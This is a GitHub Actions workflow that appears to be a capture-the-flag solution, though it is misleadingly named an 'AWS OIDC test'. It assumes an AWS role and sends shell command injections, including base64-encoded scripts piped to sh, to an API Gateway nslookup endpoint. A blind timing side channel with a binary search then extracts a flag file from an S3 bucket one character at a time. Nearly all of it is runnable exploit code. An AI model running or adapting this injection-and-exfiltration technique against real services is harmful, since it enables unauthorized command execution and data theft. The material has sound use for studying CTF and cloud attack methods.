name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Exfiltrate Flag via Timing Side-Channel
        run: |
          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          echo "=== STEP 1: SLEEP CALIBRATION ==="
          for i in 1 2; do
            START=$(date +%s%N)
            CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
              -H "Content-Type: application/json" \
              -d "{\"domain\": \"127.0.0.1; sleep $i\"}")
            END=$(date +%s%N)
            DURATION_MS=$(( (END - START) / 1000000 ))
            echo "sleep $i -> HTTP $CODE in ${DURATION_MS}ms"
          done

          echo ""
          echo "=== STEP 2: BASELINE (Python/boto3 read, no sleep) ==="
          # Condition is always FALSE for printable ASCII (max 126), so no sleep fires
          SCRIPT="cat > /tmp/getflag.py << 'PYEOF'
          import boto3, sys
          sys.stdout.write(boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')['Body'].read().decode())
          PYEOF
          FLAG=\$(python3 /tmp/getflag.py 2>/dev/null)
          if [ -z \"\$FLAG\" ]; then FLAG=\$(python /tmp/getflag.py 2>/dev/null); fi
          CHAR=\$(echo \"\$FLAG\" | cut -c1)
          ORD=\$(echo -n \"\$CHAR\" | od -An -tuC | awk '{print \$1}')
          if [ -n \"\$ORD\" ] && [ \"\$ORD\" -gt 200 ]; then sleep 2; fi"
                    ENCODED=$(echo "$SCRIPT" | base64 -w0)
                    START=$(date +%s%N)
                    CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
                      -H "Content-Type: application/json" \
                      -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
          END=$(date +%s%N)
          BASELINE_MS=$(( (END - START) / 1000000 ))
          echo "Baseline (no sleep) -> HTTP $CODE in ${BASELINE_MS}ms"
          THRESHOLD=$((BASELINE_MS + 800))
          echo "Using threshold: ${THRESHOLD}ms (baseline + 800ms)"

          echo ""
          echo "=== STEP 3: VERIFY S3 ACCESS (sleep if file is readable) ==="
          SCRIPT="cat > /tmp/getflag.py << 'PYEOF'
          import boto3, sys
          sys.stdout.write(boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')['Body'].read().decode())
          PYEOF
          FLAG=\$(python3 /tmp/getflag.py 2>/dev/null)
          if [ -z \"\$FLAG\" ]; then FLAG=\$(python /tmp/getflag.py 2>/dev/null); fi
          if [ -n \"\$FLAG\" ]; then sleep 2; fi"
                    ENCODED=$(echo "$SCRIPT" | base64 -w0)
                    START=$(date +%s%N)
                    CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
                      -H "Content-Type: application/json" \
                      -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
                    END=$(date +%s%N)
                     DURATION_MS=$(( (END - START) / 1000000 ))
                    echo "S3 read check -> HTTP $CODE in ${DURATION_MS}ms"
                    if [ "$CODE" != "504" ] && [ "$CODE" != "503" ] && [ $DURATION_MS -lt $THRESHOLD ]; then
                      echo "WARNING: S3 read may not be working. If the extraction yields all spaces, the flag is unreachable."
                    fi

          echo ""
          echo "=== STEP 4: BINARY SEARCH EXTRACTION (16 bytes) ==="
          FLAG=""
          for pos in $(seq 1 16); do
            low=32
            high=126
            while [ $low -lt $high ]; do
              mid=$(( (low + high) / 2 ))

              # Build the shell script to run inside Lambda
              # $pos and $mid are expanded by GitHub bash; everything else is literal for Lambda's shell
              SCRIPT="cat > /tmp/getflag.py << 'PYEOF'
          import boto3, sys
          sys.stdout.write(boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')['Body'].read().decode())
          PYEOF
          FLAG=\$(python3 /tmp/getflag.py 2>/dev/null)
          if [ -z \"\$FLAG\" ]; then FLAG=\$(python /tmp/getflag.py 2>/dev/null); fi
          if [ -z \"\$FLAG\" ]; then
            for p in aws /opt/aws-cli/aws /opt/aws/aws /usr/local/bin/aws /usr/bin/aws; do
              if [ -z \"\$FLAG\" ] && \$p --version > /dev/null 2>&1; then
                FLAG=\$(\$p s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1 2>/dev/null)
              fi
            done
          fi
          if [ -z \"\$FLAG\" ]; then
            for path in /var/task/flag.txt /tmp/flag.txt /opt/flag.txt /flag.txt ./flag.txt; do
              if [ -f \"\$path\" ]; then
                  FLAG=\$(cat \"\$path\" 2>/dev/null)
                break
              fi
            done
          fi
          CHAR=\$(echo \"\$FLAG\" | cut -c$pos)
          if [ -z \"\$CHAR\" ]; then CHAR=' '; fi
          ORD=\$(echo -n \"\$CHAR\" | od -An -tuC | awk '{print \$1}')
          if [ -n \"\$ORD\" ] && [ \"\$ORD\" -gt $mid ]; then sleep 2; fi"
              ENCODED=$(echo "$SCRIPT" | base64 -w0)

              START=$(date +%s%N)
              CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
                -H "Content-Type: application/json" \
                -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
              END=$(date +%s%N)
              DURATION_MS=$(( (END - START) / 1000000 ))

              # TRUE if Lambda timed out OR took longer than threshold
              if [ "$CODE" = "504" ] || [ "$CODE" = "503" ] || [ $DURATION_MS -ge $THRESHOLD ]; then
                low=$((mid + 1))
                echo "  pos $pos > $mid  (time=${DURATION_MS}ms, code=$CODE)"
              else
                high=$mid
                echo "  pos $pos <= $mid (time=${DURATION_MS}ms, code=$CODE)"
              fi
            done
            CHAR=$(python3 -c "import sys; sys.stdout.write(chr($low))")
            FLAG="$FLAG$CHAR"
            echo ">>> Position $pos: '$CHAR' (ASCII $low) | Flag so far: $FLAG"
          done

          echo ""
          echo "==================== FINAL FLAG ===================="
          echo "$FLAG"
          echo "===================================================="

          if [ "$FLAG" = "                " ]; then
            echo ""
            echo "ERROR: Flag is all spaces. Data extraction failed."
            echo "Check Step 3 (S3 read check). If it was fast (< threshold), the Lambda cannot reach S3."
          fi
